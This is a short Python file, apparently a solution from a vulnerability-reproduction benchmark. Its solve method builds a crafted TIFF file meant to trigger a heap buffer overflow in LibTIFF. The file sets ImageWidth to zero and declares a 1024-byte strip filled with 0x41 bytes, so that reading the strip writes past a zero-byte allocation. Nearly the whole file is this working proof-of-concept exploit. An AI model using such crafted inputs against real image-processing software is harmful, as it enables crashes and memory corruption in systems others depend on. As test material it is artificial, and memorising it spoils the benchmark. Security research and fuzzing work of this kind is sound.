import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in the target library (LibTIFF).
        The vulnerability is related to zero width or height images not being checked, 
        leading to a 0-byte allocation followed by a write based on StripByteCounts.
        """
        # Build a TIFF file
        # Byte order: Little Endian
        header = b'II\x2a\x00\x08\x00\x00\x00'
        
        # Tags needed to pass basic validation and reach the vulnerable code
        # We set ImageWidth to 0 to trigger the 0-allocation.
        # We provide a large StripByteCounts and data to trigger the overflow during read.
        
        # Tag entries: (Tag, Type, Count, Value)
        # Type 3=SHORT (2 bytes), 4=LONG (4 bytes)
        entries = [
            (256, 4, 1, 0),       # ImageWidth = 0 (Vulnerability trigger)
            (257, 4, 1, 10),      # ImageLength = 10
            (258, 3, 1, 8),       # BitsPerSample = 8
            (259, 3, 1, 1),       # Compression = 1 (None)
            (262, 3, 1, 1),       # PhotometricInterpretation = 1 (MinIsBlack)
            (273, 4, 1, 200),     # StripOffsets = 200 (Pointer to data)
            (277, 3, 1, 1),       # SamplesPerPixel = 1
            (278, 4, 1, 10),      # RowsPerStrip = 10
            (279, 4, 1, 1024),    # StripByteCounts = 1024 (Data to write to buffer)
        ]
        
        # Sort entries by Tag ID
        entries.sort(key=lambda x: x[0])
        
        # Construct IFD
        # Number of entries (2 bytes)
        ifd = struct.pack('<H', len(entries))
        
        for tag, type_, count, val in entries:
            # Entry structure: Tag(2), Type(2), Count(4), Value/Offset(4)
            ifd += struct.pack('<HHII', tag, type_, count, val)
            
        # Next IFD Offset (4 bytes)
        ifd += struct.pack('<I', 0)
        
        # Combine Header and IFD
        data = bytearray(header + ifd)
        
        # Pad with zeros up to StripOffsets (200)
        if len(data) < 200:
            data += b'\x00' * (200 - len(data))
            
        # Append Payload Data
        # 1024 bytes of junk data. 
        # Logic: Buffer allocated for (Width*Height) = 0 bytes.
        # Read function reads StripByteCounts (1024) bytes into that buffer -> Heap Overflow.
        data += b'\x41' * 1024
        
        return bytes(data)